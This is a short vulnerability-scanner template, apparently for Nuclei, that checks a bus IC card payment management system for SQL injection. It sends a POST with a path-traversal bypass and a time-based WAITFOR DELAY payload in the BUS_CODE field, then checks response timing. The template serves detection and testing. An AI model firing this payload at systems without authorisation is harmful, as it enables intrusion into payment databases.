id: poc-yaml-bus-ic-card-ams-bus-sqli
info:
  name: 公交IC卡收单管理系统 bus SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template identifies a SQL injection vulnerability in the 公交IC卡收单管理系统 that allows attackers to manipulate database queries.

variables:
  t1: "{{rand_int(1,5)}}"
  t2: "{{to_number(t1) * 2}}"
  t3: "{{to_number(t2) + 2}}"

http:
  - method: POST
    path:
      - "/assets/..;/bus"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      _search=false&nd=1727248354972&rowCountPerPage=10&pageNo=1&sidx=BUS_CODE&sord=asc&method=select&BUS_CODE=1');WAITFOR DELAY '0:0:{{t1}}'--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "window.top.window.jQuery"
          - "(\"#temporary_iframe_id\")"
          - "\"pageCount\":0"
      - type: dsl
        dsl:
          - "duration >= to_number(t2)"
          - "duration <= to_number(t3)"
